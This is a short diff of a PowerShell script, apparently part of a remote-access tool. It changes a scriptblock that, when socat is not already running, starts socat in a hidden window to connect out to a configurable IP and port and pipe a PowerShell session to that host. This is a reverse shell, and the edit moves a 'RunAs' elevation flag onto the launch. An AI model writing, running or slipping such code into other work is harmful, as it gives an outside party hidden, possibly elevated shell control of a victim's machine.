@@ -19,7 +19,7 @@ $scriptBlock = [Scriptblock]::Create(@'
 if(Get-Process -Name socat){
 
 }else{
-	powershell.exe -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe -Verb RunAs',pipes
+	powershell.exe -Verb RunAs -windowstyle hidden .\socat -d -d TCP4:${Ip}:${Port} EXEC:'powershell.exe',pipes
 
 }
 '@)
